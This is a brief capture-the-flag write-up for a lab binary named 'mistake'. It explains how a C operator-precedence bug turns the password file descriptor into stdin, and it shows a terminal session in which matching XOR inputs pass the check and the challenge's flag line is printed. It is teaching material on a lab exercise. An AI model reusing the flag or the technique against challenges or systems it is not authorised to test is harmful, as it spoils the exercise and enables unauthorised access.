@@ -1,0 +1,40 @@
+exploit is at:
+
+if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)
+
+This equals to:
+fd = (open("/home/mistake/password",O_RDONLY,0400) < 0)
+
+so open returns >= 0: fd = 0 -> fd = stdin
+
+
+same below:
+
+len=read(fd,pw_buf,PW_LEN) > 0
+
+--> len = (read(fd,pw_buf,PW_LEN) > 0)
+
+
+
+So here program sleeps giving us time to write on pw_buf:
+
+
+printf("do not bruteforce...\n");
+sleep(time(0)%20);
+
+char pw_buf[PW_LEN+1];
+int len;
+if(!(len=read(fd,pw_buf,PW_LEN) > 0)){ ... }
+
+
+Then program reads pw_buf1 from stdin and XORs it. Then it
+compares it with pw_buf. So:
+
+
+
+mistake@prowl:~$ ./mistake 
+do not bruteforce...
+CCCCCCCCCC
+input password : BBBBBBBBBB
+Password OK
+Mommy, the operator priority always confuses me :(
